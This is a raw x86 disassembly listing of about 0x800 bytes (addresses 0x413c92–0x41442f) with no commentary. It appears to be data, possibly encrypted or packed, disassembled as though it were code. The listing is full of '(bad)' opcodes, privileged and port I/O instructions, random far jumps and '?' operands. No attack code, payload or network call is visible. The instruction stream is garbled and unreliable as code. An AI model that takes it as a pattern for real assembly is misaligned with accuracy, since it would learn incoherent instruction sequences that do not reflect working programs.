  413c92:	adc    BYTE PTR [ebx],0x6f
  413c95:	les    ebp,FWORD PTR [ebx]
  413c97:	test   BYTE PTR [edi-0x25],ch
  413c9a:	push   esp
  413c9b:	test   DWORD PTR [ebx-0x2d],ecx
  413c9e:	fild   DWORD PTR [eax+0x53]
  413ca1:	(bad)  
  413ca2:	dec    dl
  413ca4:	mov    esp,0x3b096635
  413ca9:	lock sub DWORD PTR [eax],esp
  413cac:	jg     0x413c86
  413cae:	loopne 0x413c97
  413cb0:	push   DWORD PTR [edi]
  413cb2:	jne    0x413d14
  413cb4:	inc    esp
  413cb5:	aam    0x62
  413cb7:	fucomp st(4)
  413cb9:	test   al,0x60
  413cbb:	scas   eax,DWORD PTR es:[edi]
  413cbc:	xchg   esi,eax
  413cbd:	lds    esi,FWORD PTR [ecx+0x66]
  413cc0:	addr16 pop ss
  413cc2:	push   edx
  413cc3:	popa   
  413cc4:	jne    0x413d3f
  413cc6:	mov    ds:0xdbbf6eb1,eax
  413ccb:	push   esi
  413ccc:	mov    edx,0xe8ce565b
  413cd1:	push   esp
  413cd2:	jp     0x413cdf
  413cd4:	or     al,0x73
  413cd6:	mov    gs,WORD PTR [esi-0x43]
  413cd9:	inc    esp
  413cda:	rcl    DWORD PTR [edx-0x1b86d2dd],0x0
  413ce1:	sbb    ch,BYTE PTR [esi]
  413ce3:	push   0x610e7065
  413ce8:	mov    bl,0x77
  413cea:	jp     0x413d10
  413cec:	(bad)  
  413ced:	sbb    bh,BYTE PTR [edi+0x214f0917]
  413cf3:	les    esp,FWORD PTR [eax]
  413cf5:	lahf   
  413cf6:	xchg   esp,eax
  413cf7:	adc    eax,0xe51723a2
  413cfc:	bound  ecx,QWORD PTR [ebp+0x20]
  413cff:	cmp    bh,BYTE PTR [eax+0x2]
  413d02:	push   eax
  413d03:	imul   DWORD PTR ss:[eax]
  413d06:	add    al,0x29
  413d08:	push   ss
  413d09:	fsubr  QWORD PTR [ecx]
  413d0b:	pop    ecx
  413d0c:	push   ebx
  413d0d:	sbb    al,0x51
  413d0f:	dec    esp
  413d10:	mov    eax,ds:0x67985be0
  413d15:	daa    
  413d16:	xor    esp,DWORD PTR [esi+0x143d2ad7]
  413d1c:	call   0x27d4:0x5aab06c5
  413d23:	adc    al,0x31
  413d25:	enter  0xbd83,0x5c
  413d29:	ror    DWORD PTR [ebx+0x6d],cl
  413d2c:	test   al,0x2e
  413d2e:	inc    ebp
  413d2f:	and    ecx,esi
  413d31:	out    0x10,al
  413d33:	xchg   edx,eax
  413d34:	mov    ds:0xd6db5230,al
  413d39:	mov    edi,0x86d708f9
  413d3e:	stos   DWORD PTR es:[edi],eax
  413d3f:	xor    al,BYTE PTR [ecx-0x50cdfb9d]
  413d45:	ret    0xd94a
  413d48:	sahf   
  413d49:	inc    ebx
  413d4a:	ret    
  413d4b:	jge    0x413daa
  413d4d:	sti    
  413d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d4f:	xor    ebp,DWORD PTR [eax-0x7cd52683]
  413d55:	cmp    DWORD PTR [esi-0x52],ebx
  413d58:	cmp    BYTE PTR [ecx-0x33c1263c],0xed
  413d5f:	adc    dh,BYTE PTR [edi]
  413d61:	cld    
  413d62:	outs   dx,BYTE PTR ds:[esi]
  413d63:	lock adc ebp,0x9689184
  413d6a:	loope  0x413d93
  413d6c:	add    ah,BYTE PTR [edx+0x6f]
  413d6f:	mov    DWORD PTR [esi-0x23],edi
  413d72:	out    0xe,al
  413d74:	call   0xe892:0xd93a856e
  413d7b:	icebp  
  413d7c:	and    BYTE PTR [esi+0x2ab462],bl
  413d82:	mov    bh,0x1d
  413d84:	rol    DWORD PTR [edx],cl
  413d86:	fs je  0x413d9a
  413d89:	fadd   st,st(7)
  413d8b:	push   eax
  413d8c:	ds push edi
  413d8e:	iret   
  413d8f:	cmp    eax,0xd81cd95b
  413d94:	pop    eax
  413d95:	into   
  413d96:	xchg   esp,eax
  413d97:	mov    eax,ds:0xf58d05a
  413d9c:	push   ebp
  413d9d:	mov    BYTE PTR [esi+0x8804390],cl
  413da3:	or     al,BYTE PTR [ebp+0x4e]
  413da6:	aas    
  413da7:	repz ss push ss
  413daa:	pop    ss
  413dab:	hlt    
  413dac:	js     0x413d47
  413dae:	fsubrp st(7),st
  413db0:	ret    0x67f9
  413db3:	lock ja 0x413e16
  413db6:	jae    0x413d8e
  413db8:	adc    DWORD PTR [ecx-0x76],0x67
  413dbc:	inc    ebx
  413dbd:	les    ebx,FWORD PTR [edx]
  413dbf:	fcom   st(7)
  413dc1:	rol    bh,0xb2
  413dc4:	fisttp WORD PTR [ebp+0x13]
  413dc7:	rcl    BYTE PTR [esi+0x71],1
  413dca:	aad    0x1d
  413dcc:	mov    bl,0x47
  413dce:	jl     0x413de0
  413dd0:	pop    eax
  413dd1:	fcom   st(6)
  413dd4:	mov    al,0xaa
  413dd6:	dec    esi
  413dd7:	fs es jecxz 0x413e2b
  413ddb:	dec    ecx
  413ddc:	mov    WORD PTR [ebx],cs
  413dde:	pop    ebp
  413ddf:	pusha  
  413de0:	scas   al,BYTE PTR es:[edi]
  413de1:	aam    0x97
  413de3:	neg    DWORD PTR [esi-0xf041b48]
  413de9:	jne    0x413d8d
  413deb:	les    ebp,FWORD PTR [ecx-0x15]
  413dee:	in     al,dx
  413def:	std    
  413df0:	leave  
  413df1:	(bad)  
  413df2:	mov    ah,BYTE PTR [esi+0x3e]
  413df5:	dec    esi
  413df6:	xchg   ebp,eax
  413df7:	push   ebx
  413df8:	js     0x413d8f
  413dfa:	and    esp,DWORD PTR [edi-0x6]
  413dfd:	or     BYTE PTR [esi-0x7ccdd8],0x18
  413e04:	jl     0x413de1
  413e06:	jb     0x413de6
  413e08:	popa   
  413e09:	std    
  413e0a:	(bad)  [ecx+0x2d9704f7]
  413e10:	stos   DWORD PTR es:[edi],eax
  413e11:	pop    edx
  413e12:	mov    ecx,DWORD PTR [esi]
  413e14:	lock push cs
  413e16:	bound  ebp,QWORD PTR [eax-0x6]
  413e19:	test   BYTE PTR [esi-0x59],dl
  413e1c:	cld    
  413e1d:	xor    esp,DWORD PTR [edi-0x5b]
  413e20:	dec    edx
  413e21:	test   BYTE PTR [edi],ah
  413e23:	stos   BYTE PTR es:[edi],al
  413e24:	xchg   edi,eax
  413e25:	cld    
  413e26:	dec    eax
  413e27:	sbb    ebx,0xffffff92
  413e2a:	in     eax,dx
  413e2b:	dec    esi
  413e2c:	stos   BYTE PTR es:[edi],al
  413e2d:	adc    dh,bh
  413e2f:	pushf  
  413e30:	jge    0x413e6f
  413e32:	xchg   edi,eax
  413e33:	addr16 dec ecx
  413e35:	xor    al,0x44
  413e37:	sbb    al,0x61
  413e39:	mov    dh,0x83
  413e3b:	cmp    al,0x50
  413e3d:	fist   WORD PTR [ecx]
  413e3f:	or     ebp,0xffffff9f
  413e42:	and    BYTE PTR [edx+0xbbb07fa],0xca
  413e49:	dec    eax
  413e4a:	scas   al,BYTE PTR es:[edi]
  413e4b:	xchg   ebx,eax
  413e4c:	sbb    eax,0x935ecd57
  413e51:	sbb    ecx,edx
  413e53:	stos   DWORD PTR es:[edi],eax
  413e54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e55:	pop    ds
  413e56:	ret    0x2564
  413e59:	out    dx,al
  413e5a:	xlat   BYTE PTR ds:[ebx]
  413e5b:	psllq  mm5,QWORD PTR [ecx]
  413e5e:	adc    BYTE PTR [edi],0x70
  413e61:	dec    BYTE PTR [ebx+0x5104a9a6]
  413e67:	add    eax,0x43e05042
  413e6c:	stc    
  413e6d:	cs mov eax,eax
  413e70:	out    dx,al
  413e71:	xchg   ecx,eax
  413e72:	mov    ax,ds:0x9e7b9e80
  413e78:	(bad)  
  413e7a:	adc    edi,esp
  413e7c:	stos   BYTE PTR es:[edi],al
  413e7d:	push   edi
  413e7e:	sbb    cl,BYTE PTR [edi]
  413e80:	inc    ebx
  413e81:	jg     0x413edb
  413e83:	out    dx,eax
  413e84:	lea    ecx,[edx]
  413e86:	repnz outs dx,BYTE PTR ds:[esi]
  413e88:	cmp    al,0x70
  413e8a:	cli    
  413e8b:	test   DWORD PTR [edx+0x6],ebp
  413e8e:	or     eax,0xa38c2ad9
  413e93:	mov    WORD PTR [esi],?
  413e95:	dec    edi
  413e96:	pop    esi
  413e97:	call   0x8cb2:0xa7a9b813
  413e9e:	imul   esi,DWORD PTR [edx-0x61],0x3e
  413ea2:	inc    esp
  413ea3:	es and al,0xb5
  413ea6:	imul   esi
  413ea8:	mul    BYTE PTR fs:[eax]
  413eab:	pop    ebx
  413eac:	mov    al,ds:0x4bf20e35
  413eb1:	pusha  
  413eb2:	lea    ecx,[edi]
  413eb4:	and    ch,0xae
  413eb7:	aad    0x84
  413eb9:	or     BYTE PTR [edx-0x42475215],0x63
  413ec0:	sub    ecx,DWORD PTR [esi+0x76]
  413ec3:	inc    esi
  413ec4:	ins    BYTE PTR es:[edi],dx
  413ec5:	xor    ebp,eax
  413ec7:	push   ecx
  413ec8:	js     0x413e50
  413eca:	cmp    DWORD PTR [edx-0x7ea63687],edx
  413ed0:	enter  0x2da4,0x83
  413ed4:	push   ecx
  413ed5:	mov    bh,0xc7
  413ed7:	mov    ?,ebx
  413ed9:	push   edx
  413eda:	add    BYTE PTR [ebp-0x44],dl
  413edd:	push   ecx
  413ede:	jmp    0x24220c41
  413ee3:	dec    ebp
  413ee4:	std    
  413ee5:	push   ebp
  413ee6:	push   cs
  413ee7:	and    al,0x68
  413ee9:	std    
  413eea:	fidiv  WORD PTR [ecx+eax*1-0x3f5b0f2f]
  413ef1:	call   0x978fd598
  413ef6:	inc    esi
  413ef7:	neg    DWORD PTR [ebx+0x17]
  413efa:	je     0x413ebc
  413efc:	mov    ds:0xe45c31d1,al
  413f01:	popa   
  413f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f03:	and    al,0x4f
  413f05:	sub    BYTE PTR [ebp-0x17b48541],bl
  413f0b:	mov    ecx,0xfb1b325e
  413f10:	jge    0x413e93
  413f12:	mov    dl,dh
  413f14:	js     0x413ead
  413f16:	mov    ds:0xd6e7b90d,al
  413f1b:	test   DWORD PTR [edi],esi
  413f1d:	scas   al,BYTE PTR es:[edi]
  413f1e:	jb     0x413f0a
  413f20:	jb     0x413f59
  413f22:	cmp    DWORD PTR [edi+esi*2-0x7e],0xa2fa00e
  413f2a:	pop    ds
  413f2b:	rcl    DWORD PTR ds:[edi],0xb8
  413f2f:	pop    ss
  413f30:	adc    ch,ch
  413f32:	in     al,0x17
  413f34:	mov    al,0x74
  413f36:	inc    ecx
  413f37:	mov    bh,0x6a
  413f39:	jle    0x413f3d
  413f3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f3c:	popa   
  413f3d:	sub    BYTE PTR [ecx],0x20
  413f40:	nop
  413f41:	mov    al,0xc4
  413f43:	fdivr  st(6),st
  413f45:	fcomp  QWORD PTR [ecx]
  413f47:	and    BYTE PTR [bx+si-0x5ef9],0x2d
  413f4d:	add    edi,edi
  413f4f:	adc    BYTE PTR [ebp-0x4e],0xa
  413f53:	arpl   WORD PTR [ecx-0x8],dx
  413f56:	push   0x7b
  413f58:	test   eax,0x209e5eec
  413f5d:	jmp    0x8379586b
  413f62:	in     al,0xe1
  413f64:	push   ebp
  413f65:	xchg   esi,eax
  413f66:	xor    eax,0xbbc83aee
  413f6b:	loop   0x413f23
  413f6d:	sub    eax,0x7eb55800
  413f72:	cmp    esp,DWORD PTR [ebx]
  413f74:	dec    ebx
  413f75:	adc    ebp,esp
  413f77:	in     al,dx
  413f78:	fcom   DWORD PTR [ecx+0x47]
  413f7b:	xchg   ecx,eax
  413f7c:	or     ah,BYTE PTR [esi-0x5ac92ece]
  413f82:	jl     0x413f1d
  413f84:	mov    ds:0x11a35255,al
  413f89:	mov    ah,BYTE PTR [ebp+eax*8+0x1050d4d1]
  413f90:	or     al,0x39
  413f92:	mov    edi,0x2711c255
  413f97:	out    dx,al
  413f98:	or     ch,cl
  413f9a:	or     al,0x91
  413f9c:	test   eax,0x33013f55
  413fa1:	lahf   
  413fa2:	mov    ah,0x63
  413fa4:	dec    eax
  413fa5:	les    esi,FWORD PTR [edi]
  413fa7:	dec    eax
  413fa8:	xchg   ebp,eax
  413fa9:	jbe    0x413f37
  413fab:	jbe    0x413fb0
  413fad:	mov    ds:0x5a2933ce,al
  413fb2:	dec    DWORD PTR [esi]
  413fb4:	jl     0x413f88
  413fb6:	mov    edi,0xc9d777d2
  413fbb:	es repz mov al,0x14
  413fbf:	retf   
  413fc0:	arpl   WORD PTR [ebx],di
  413fc2:	out    0xb0,eax
  413fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fc5:	dec    edi
  413fc6:	je     0x413f7f
  413fc8:	cmc    
  413fc9:	or     al,0x83
  413fcb:	and    DWORD PTR [ebx],ebp
  413fcd:	fsin   
  413fcf:	xlat   BYTE PTR ds:[ebx]
  413fd1:	pushf  
  413fd2:	pop    ss
  413fd3:	xchg   ebp,eax
  413fd4:	mov    BYTE PTR [eax+0x16],cl
  413fd7:	push   es
  413fd8:	leave  
  413fd9:	jbe    0x413f67
  413fdb:	fidiv  WORD PTR [ebp+0x39d797d9]
  413fe1:	ds adc edx,ebx
  413fe4:	push   ebx
  413fe5:	pop    es
  413fe6:	ja     0x413f81
  413fe8:	push   edi
  413fe9:	iret   
  413fea:	sub    DWORD PTR [ebx+0x58],eax
  413fed:	mov    al,ds:0xd7283d08
  413ff2:	mov    bl,al
  413ff4:	dec    esi
  413ff5:	aad    0x7d
  413ff7:	add    edx,esp
  413ff9:	retf   0xbc90
  413ffc:	rol    edx,cl
  413ffe:	cmc    
  413fff:	push   eax
  414000:	(bad)  
  414001:	push   cs
  414002:	pop    esp
  414003:	push   eax
  414004:	repnz and al,ch
  414007:	push   edx
  414008:	hlt    
  414009:	test   DWORD PTR [edx-0x315ad0f0],ecx
  41400f:	js     0x413fac
  414011:	jg     0x41402a
  414013:	mov    ecx,0xa35dc5c0
  414018:	aam    0x29
  41401a:	sub    DWORD PTR [ebx],esi
  41401c:	outs   dx,BYTE PTR ds:[esi]
  41401d:	wbinvd 
  41401f:	adc    esi,DWORD PTR [ebx+0x6e]
  414022:	mov    al,ds:0x6a05d323
  414027:	in     eax,dx
  414028:	jns    0x414032
  41402a:	dec    ecx
  41402b:	outs   dx,BYTE PTR ds:[esi]
  41402c:	ja     0x414026
  41402e:	(bad)  
  41402f:	fld    QWORD PTR [ebx+0x34fb43e6]
  414035:	ins    DWORD PTR es:[edi],dx
  414036:	xchg   esp,eax
  414037:	or     al,0x72
  414039:	jae    0x413fe3
  41403b:	push   ebx
  41403c:	ss mov gs,eax
  41403f:	jns    0x414088
  414041:	fstp   TBYTE PTR [ebp-0x13df5d7]
  414047:	ss xchg edx,eax
  414049:	shl    BYTE PTR [eax+0x24d86133],cl
  41404f:	cmp    DWORD PTR [eax-0x25],0xffffffec
  414053:	out    0x58,al
  414055:	lds    ebp,FWORD PTR [esi+ecx*8+0x4b]
  414059:	xchg   edx,eax
  41405a:	inc    edx
  41405b:	jne    0x4140a1
  41405d:	push   esp
  41405e:	xor    eax,0x92a7514c
  414063:	jb     0x41408b
  414065:	mov    eax,0x357ca59a
  41406a:	add    eax,0x45aa5148
  41406f:	sub    DWORD PTR [edi],esi
  414071:	aaa    
  414072:	push   esi
  414073:	and    esp,DWORD PTR [edx-0x24]
  414076:	cmp    eax,0xf818d42a
  41407b:	inc    edx
  41407c:	ja     0x4140b5
  41407e:	xor    eax,0xbbda1e14
  414083:	mov    ecx,0x4d694927
  414088:	lds    eax,FWORD PTR [ebx-0x3837cf1]
  41408e:	push   cs
  41408f:	inc    ebx
  414090:	push   0x56a4f4a
  414095:	xchg   ebx,eax
  414096:	dec    edx
  414097:	mov    bh,0x94
  414099:	xor    esp,ebp
  41409b:	test   eax,0xd162c939
  4140a0:	jmp    0x33fa6730
  4140a5:	les    ebx,FWORD PTR [eax+0x358d57c4]
  4140ab:	popa   
  4140ac:	(bad)  [ecx+eiz*2-0x37d8a621]
  4140b3:	mov    cs,WORD PTR [ebx]
  4140b5:	push   0xffffff8d
  4140b7:	test   BYTE PTR [ebx+0x46],bh
  4140ba:	test   DWORD PTR [eax],eax
  4140bc:	push   ds
  4140bd:	xchg   esp,eax
  4140be:	dec    ebp
  4140bf:	bound  edx,QWORD PTR [esi+esi*2+0x7345daef]
  4140c6:	xor    eax,0x3d824cf5
  4140cb:	xor    al,BYTE PTR [edx-0x75f8b16d]
  4140d1:	xor    DWORD PTR [ecx-0x79],edi
  4140d4:	pop    eax
  4140d5:	fcmovbe st,st(3)
  4140d7:	xlat   BYTE PTR ds:[ebx]
  4140d8:	gs or  bh,dl
  4140db:	pop    eax
  4140dc:	test   DWORD PTR [edi],edx
  4140de:	pop    esi
  4140df:	mov    al,ds:0xea29b632
  4140e4:	sahf   
  4140e5:	mov    bh,0x3f
  4140e7:	xchg   esp,eax
  4140e8:	or     dl,BYTE PTR [ebp+0x413db47]
  4140ee:	push   es
  4140ef:	arpl   WORD PTR [esi+0x669ee999],ax
  4140f5:	jbe    0x4140e3
  4140f7:	inc    edi
  4140f8:	or     al,0x3f
  4140fa:	(bad)  
  4140fb:	jnp    0x414124
  4140fd:	sbb    esp,DWORD PTR [esi]
  4140ff:	jo     0x41412b
  414101:	mov    eax,ds:0x755eb9fe
  414106:	pop    ds
  414107:	mov    dl,0x88
  414109:	jnp    0x4140d2
  41410b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41410c:	leave  
  41410d:	in     eax,dx
  41410e:	gs jbe 0x41416a
  414111:	jbe    0x4140c7
  414113:	sbb    eax,0x8513c1e5
  414118:	mov    BYTE PTR [ecx-0x14eb8af2],dl
  41411e:	push   0x7f594f0d
  414123:	idiv   ebp
  414125:	or     DWORD PTR [edx-0x4f7d6e14],0xffffff90
  41412c:	inc    ebp
  41412d:	je     0x4140db
  41412f:	sbb    al,0x1e
  414131:	add    BYTE PTR [ebx+0x5f],ah
  414134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414135:	aas    
  414136:	and    eax,0x66fcdcc
  41413b:	sbb    esp,DWORD PTR [eax-0x786c50bc]
  414141:	ds mov fs,ecx
  414144:	(bad)  
  414145:	mov    eax,0xbcd4b1ff
  41414a:	leave  
  41414b:	inc    ebx
  41414c:	popf   
  41414d:	(bad)  
  41414e:	in     eax,dx
  41414f:	cmp    al,0xcb
  414151:	or     DWORD PTR [edi-0x527a1933],0xffffff8e
  414158:	aad    0x8b
  41415a:	out    0xa0,eax
  41415c:	sub    esp,DWORD PTR [edi]
  41415e:	cmovp  edi,DWORD PTR ds:0x490c6d44
  414165:	jnp    0x414112
  414167:	xchg   ebx,eax
  414168:	dec    edi
  414169:	mov    dh,0xf9
  41416b:	push   cs
  41416c:	push   0xffffffeb
  41416e:	pop    ss
  41416f:	ret    0xb785
  414172:	inc    ebp
  414173:	icebp  
  414174:	pop    esi
  414175:	sbb    ch,BYTE PTR [esi+0x3d]
  414178:	push   edi
  414179:	sub    esi,DWORD PTR [esi+eax*8+0x58]
  41417d:	ffreep st(4)
  41417f:	stos   DWORD PTR es:[edi],eax
  414180:	mov    cl,0xad
  414182:	(bad)  
  414183:	mov    cl,0x63
  414185:	pushf  
  414186:	je     0x414118
  414188:	stos   BYTE PTR es:[edi],al
  414189:	mov    bh,BYTE PTR [edi+ebx*1+0x1c]
  41418d:	jmp    0xb880:0x14c6cb61
  414194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414195:	pushf  
  414196:	mov    al,ds:0x30002e06
  41419b:	add    eax,0x323ee95b
  4141a0:	in     eax,dx
  4141a1:	add    eax,0x1192da97
  4141a6:	repz push ss
  4141a8:	repz or BYTE PTR [ecx],0xc6
  4141ac:	rcr    BYTE PTR [ebp-0x231fd89e],1
  4141b2:	stos   BYTE PTR es:[edi],al
  4141b3:	pop    esi
  4141b4:	or     eax,0x85e8035
  4141b9:	or     eax,0xae373be1
  4141be:	cld    
  4141bf:	jl     0x4141a9
  4141c1:	data16 stc 
  4141c3:	adc    BYTE PTR [ebp+0x6c],al
  4141c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141c7:	dec    edi
  4141c8:	paddw  mm5,QWORD PTR [eax+0x1f]
  4141cc:	pop    ebp
  4141cd:	cld    
  4141ce:	jl     0x414239
  4141d0:	inc    esi
  4141d1:	xor    BYTE PTR [edi-0xc0e09b4],0xb1
  4141d8:	popf   
  4141d9:	cmp    BYTE PTR [ecx-0x70],ah
  4141dc:	pop    ebx
  4141dd:	cld    
  4141de:	adc    esp,DWORD PTR [ebp+0x7bb59ad0]
  4141e4:	push   edx
  4141e5:	pop    esi
  4141e6:	jbe    0x414264
  4141e8:	jge    0x4141ae
  4141ea:	test   BYTE PTR gs:[esi-0x44ea94c],al
  4141f1:	pop    es
  4141f2:	xlat   BYTE PTR ds:[ebx]
  4141f3:	shl    DWORD PTR [edi-0x61],cl
  4141f6:	daa    
  4141f7:	jnp    0x41417b
  4141f9:	rcl    DWORD PTR [edi],1
  4141fb:	xchg   BYTE PTR [ecx-0xa4aade3],bl
  414201:	aaa    
  414202:	jmp    0x414188
  414204:	push   0x243dd793
  414209:	push   esp
  41420a:	in     al,0x87
  41420c:	mov    WORD PTR [edx-0x65],fs
  41420f:	pop    ds
  414210:	mov    ecx,0x3dac6a2b
  414215:	dec    BYTE PTR [eax]
  414217:	push   es
  414218:	push   edx
  414219:	imul   ecx,DWORD PTR [esi+0x6e],0xffffff85
  41421d:	lods   al,BYTE PTR ds:[esi]
  41421e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41421f:	push   edi
  414220:	gs daa 
  414222:	out    0x12,al
  414224:	pop    ds
  414225:	xor    bh,BYTE PTR [edi]
  414227:	pop    edx
  414228:	pop    esp
  414229:	and    esi,ecx
  41422b:	push   0x1a
  41422d:	ret    0xb63b
  414230:	fs and ebp,edx
  414233:	jle    0x414207
  414235:	cmp    eax,0xa6e28928
  41423b:	inc    ebp
  41423c:	dec    ebp
  41423d:	mov    eax,ds:0xacf6deb3
  414242:	aaa    
  414243:	test   DWORD PTR [edi],0xc749d9cb
  414249:	or     cl,BYTE PTR [eax-0x1082a58]
  41424f:	push   ebx
  414250:	xor    edi,DWORD PTR [edi+0x66]
  414253:	push   ecx
  414254:	sbb    al,0x9b
  414256:	mov    cs,WORD PTR ss:[ebp-0x5350f569]
  41425d:	ins    DWORD PTR es:[edi],dx
  41425e:	mov    cl,0xba
  414260:	inc    esi
  414261:	lds    edi,FWORD PTR [ebx-0x3691fa00]
  414267:	fimul  WORD PTR [ebp+0x4e310a7d]
  41426d:	push   ss
  41426e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41426f:	(bad)
  414272:	imul   ecx,DWORD PTR [esi-0x11],0xb53acfd8
  414279:	ret    
  41427a:	xchg   esi,eax
  41427b:	mov    ch,BYTE PTR [edi-0x5dd5d565]
  414281:	lahf   
  414282:	dec    ebp
  414283:	cli    
  414284:	sbb    esp,edx
  414286:	pop    ebp
  414287:	test   DWORD PTR ds:[ebp+0x23b44389],ebx
  41428e:	pop    ecx
  41428f:	jmp    0x1aa8:0xc5c0a914
  414296:	gs out dx,al
  414298:	adc    esi,ecx
  41429a:	ret    
  41429b:	xchg   DWORD PTR [eax+0x548cd6bf],esp
  4142a1:	push   es
  4142a2:	in     al,0xa1
  4142a4:	dec    ecx
  4142a5:	ds test ebp,0x66b07617
  4142ac:	push   ecx
  4142ad:	and    bl,BYTE PTR [esi-0x3a]
  4142b0:	scas   eax,DWORD PTR es:[edi]
  4142b1:	and    DWORD PTR [ebx],esp
  4142b3:	jmp    0x4142c7
  4142b5:	fcmovnbe st,st(4)
  4142b7:	or     eax,0x4416a4b8
  4142bc:	jae    0x414244
  4142be:	lods   eax,DWORD PTR ds:[esi]
  4142bf:	jmp    0xd39f:0xf7dfdc67
  4142c6:	in     eax,0xe8
  4142c8:	push   edi
  4142c9:	mov    DWORD PTR ds:0x640aa2cf,eax
  4142cf:	jb     0x4142c1
  4142d1:	jl     0x4142f7
  4142d3:	inc    ebx
  4142d4:	pop    edx
  4142d5:	ins    DWORD PTR es:[edi],dx
  4142d6:	je     0x41427d
  4142d8:	retf   
  4142d9:	or     DWORD PTR [edx+0x5f002e52],ebx
  4142df:	rcl    DWORD PTR [esi+0xadf85c1],0x54
  4142e6:	dec    esp
  4142e7:	xchg   cl,dh
  4142e9:	imul   eax,DWORD PTR [ebx],0xe95f85cd
  4142ef:	int    0x4b
  4142f1:	and    ah,ch
  4142f3:	xlat   BYTE PTR ds:[ebx]
  4142f4:	imul   eax,eax,0x4
  4142f7:	and    dl,BYTE PTR [ecx+0x5a07f9ee]
  4142fd:	icebp  
  4142fe:	gs push ecx
  414300:	out    0xf0,al
  414302:	fcmove st,st(6)
  414304:	jne    0x4142a9
  414306:	adc    eax,DWORD PTR [esi+0x77]
  414309:	jl     0x414293
  41430b:	js     0x41432c
  41430d:	outs   dx,BYTE PTR ds:[esi]
  41430e:	cld    
  41430f:	dec    ebx
  414310:	xor    edi,esi
  414312:	iret   
  414313:	loope  0x414375
  414315:	push   ds
  414316:	nop
  414317:	rcl    DWORD PTR [ebx],1
  414319:	repz push edi
  41431b:	push   eax
  41431c:	xchg   esp,eax
  41431d:	pop    edx
  41431e:	ja     0x414356
  414320:	add    BYTE PTR [esi],bl
  414322:	and    ch,BYTE PTR gs:[edi]
  414325:	xchg   ah,cl
  414327:	ins    BYTE PTR es:[edi],dx
  414328:	dec    esi
  414329:	pop    ecx
  41432a:	mov    ah,0xf1
  41432c:	outs   dx,BYTE PTR ds:[esi]
  41432d:	cmp    ebp,DWORD PTR [eax-0x39]
  414330:	jmp    0xea67:0xe03f6e90
  414337:	scas   al,BYTE PTR es:[edi]
  414338:	xchg   esp,eax
  414339:	push   es
  41433a:	sbb    eax,0x368a5ac5
  41433f:	xchg   ebx,eax
  414340:	or     DWORD PTR [ecx],0xffffffe2
  414343:	xor    eax,0xeca4871f
  414348:	mov    BYTE PTR [eax-0x557132e2],bh
  41434e:	sbb    esp,DWORD PTR [esi-0x3bebfaec]
  414354:	and    al,0x8f
  414356:	fcomi  st,st(7)
  414358:	in     eax,dx
  414359:	outs   dx,BYTE PTR ds:[esi]
  41435a:	jge    0x414381
  41435c:	xor    al,0x98
  41435e:	pop    DWORD PTR [esi+0x40197fe5]
  414364:	xchg   ecx,eax
  414365:	mov    esp,0xdd2c1a42
  41436a:	push   ebx
  41436b:	mov    WORD PTR [edx+0x4cf46e8f],ss
  414371:	addr16 mov ds:0x9bf9,eax
  414375:	and    BYTE PTR [eax],ch
  414377:	xchg   esi,eax
  414378:	push   0xffffff85
  41437a:	add    DWORD PTR [edx-0x42],0x16
  41437e:	inc    ecx
  41437f:	xchg   ecx,eax
  414380:	arpl   WORD PTR [ecx+0x22dbb14c],dx
  414386:	lea    edx,[ebx]
  414388:	mov    bh,0xa7
  41438a:	push   esi
  41438b:	xor    BYTE PTR [edx+0x55],0x1c
  41438f:	sub    dl,BYTE PTR [ebx]
  414391:	sbb    ch,BYTE PTR [ecx-0x146c2af6]
  414397:	cli    
  414398:	xchg   edx,eax
  414399:	add    DWORD PTR [ebp+0x62],0xffffffbd
  41439d:	ins    BYTE PTR es:[edi],dx
  41439e:	fist   WORD PTR [edi-0x5f]
  4143a1:	das    
  4143a2:	xchg   DWORD PTR [ecx+0x47],esi
  4143a5:	mov    edi,0xc66d9ed2
  4143aa:	sbb    BYTE PTR [ebp+0x178150d],ah
  4143b0:	dec    ebx
  4143b1:	mov    dl,0x5
  4143b3:	leave  
  4143b4:	aas    
  4143b5:	push   edx
  4143b6:	push   0xffffffe7
  4143b8:	and    esi,DWORD PTR [eax-0x408c29ef]
  4143be:	(bad)  
  4143bf:	jp     0x414363
  4143c1:	mov    bl,0xd4
  4143c3:	leave  
  4143c4:	test   BYTE PTR [esi+ecx*4],dl
  4143c7:	out    0x1c,eax
  4143c9:	xor    al,0x7c
  4143cb:	repz mov edx,0xded4742f
  4143d1:	pop    eax
  4143d2:	(bad)  
  4143d3:	dec    eax
  4143d4:	jle    0x41437e
  4143d6:	add    eax,0xc61e8d82
  4143db:	adc    bh,dh
  4143dd:	or     BYTE PTR [edi+edx*4],0x3b
  4143e1:	lock mov ecx,0x84888ed6
  4143e7:	scas   eax,DWORD PTR es:[edi]
  4143e8:	push   ebx
  4143e9:	in     al,0x87
  4143eb:	mov    bl,0x20
  4143ed:	mov    WORD PTR [esi],?
  4143ef:	(bad)  
  4143f0:	es xchg edi,eax
  4143f2:	inc    ebp
  4143f3:	loop   0x414432
  4143f5:	sub    eax,0xa3cd28d6
  4143fa:	push   ebp
  4143fb:	ret    
  4143fc:	mov    ds:0xc783c319,al
  414401:	and    BYTE PTR [ebp+0x292b179],dh
  414407:	add    esi,edi
  414409:	sahf   
  41440a:	scas   eax,DWORD PTR es:[edi]
  41440b:	adc    BYTE PTR [ebx-0x6c],ch
  41440e:	mov    eax,0xceacbebf
  414413:	data16 inc BYTE PTR [esi]
  414416:	dec    edi
  414417:	jp     0x41448f
  414419:	inc    eax
  41441a:	and    al,0xd5
  41441c:	lds    edx,FWORD PTR [edi-0x47]
  41441f:	in     al,0x8e
  414421:	sbb    ebp,ebp
  414423:	inc    ebx
  414424:	loop   0x41442b
  414426:	scas   al,BYTE PTR es:[edi]
  414427:	int    0xe4
  414429:	add    edi,esp
  41442b:	outs   dx,BYTE PTR ds:[esi]
  41442c:	out    dx,eax
  41442d:	js     0x4143ee
  41442f:	sar    DWORD PTR [ebx+0x39],1
